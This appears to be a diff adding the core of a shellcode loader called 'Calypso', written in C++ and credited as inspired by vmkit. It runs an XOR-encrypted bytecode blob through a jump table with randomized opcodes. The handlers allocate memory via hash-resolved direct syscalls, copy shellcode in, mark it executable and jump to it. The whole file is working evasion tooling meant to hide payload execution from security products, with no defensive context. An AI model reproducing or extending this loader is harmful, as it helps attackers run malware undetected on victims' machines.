@@ -1,0 +1,84 @@
+// Calypso - IR Bytecode VM Execution Engine
+// Inspired by vmkit (mochabyte0x)
+// 256-entry jump table with randomized opcodes and XOR-encrypted bytecode
+
+struct alignas(8) IrOp {
+    uint8_t  opcode;
+    uint8_t  reserved[7];
+    uint64_t args[4];
+};
+
+struct IrContext {
+    uint8_t* shellcode;
+    size_t   shellcode_len;
+    void*    region;
+    size_t   region_size;
+};
+
+using IrHandler = void(*)(IrContext&, const IrOp&);
+
+static void ir_nop(IrContext&, const IrOp&) {}
+
+static void ir_alloc(IrContext& ctx, const IrOp&) {
+    HANDLE hProc = GetCurrentProcess();
+    PVOID base = nullptr;
+    SIZE_T size = ctx.shellcode_len;
+    auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
+    if (!NtAVM) return;
+    NtAVM(hProc, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    ctx.region = base;
+    ctx.region_size = size;
+}
+
+static void ir_write(IrContext& ctx, const IrOp&) {
+    if (ctx.region && ctx.shellcode)
+        memcpy(ctx.region, ctx.shellcode, ctx.shellcode_len);
+}
+
+static void ir_protect(IrContext& ctx, const IrOp&) {
+    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
+    if (!NtPVM || !ctx.region) return;
+    PVOID base = ctx.region;
+    SIZE_T size = ctx.region_size;
+    ULONG old_prot;
+    NtPVM(GetCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, &old_prot);
+}
+
+static void ir_exec(IrContext& ctx, const IrOp&) {
+    if (ctx.region) {
+        auto fn = reinterpret_cast<void(*)()>(ctx.region);
+        fn();
+    }
+}
+
+static void ir_decrypt(uint8_t* data, size_t len, uint32_t seed) {
+    for (size_t i = 0; i < len; i++) {
+        uint8_t k = static_cast<uint8_t>((seed ^ (i * 0x6D)) & 0xFF);
+        data[i] ^= k;
+    }
+}
+
+static bool vm_ir_execute(uint8_t* shellcode, size_t sc_len,
+                          uint8_t* ir_blob, size_t ir_blob_len,
+                          uint32_t ir_seed) {
+    ir_decrypt(ir_blob, ir_blob_len, ir_seed);
+
+    IrHandler table[256];
+    for (int i = 0; i < 256; i++) table[i] = ir_nop;
+    table[{{VM_IR_OP_ALLOC}}]   = ir_alloc;
+    table[{{VM_IR_OP_WRITE}}]   = ir_write;
+    table[{{VM_IR_OP_PROTECT}}] = ir_protect;
+    table[{{VM_IR_OP_EXEC}}]    = ir_exec;
+
+    IrContext ctx = {};
+    ctx.shellcode = shellcode;
+    ctx.shellcode_len = sc_len;
+
+    size_t op_count = ir_blob_len / sizeof(IrOp);
+    auto* ops = reinterpret_cast<IrOp*>(ir_blob);
+
+    for (size_t i = 0; i < op_count; i++)
+        table[ops[i].opcode](ctx, ops[i]);
+
+    return ctx.region != nullptr;
+}
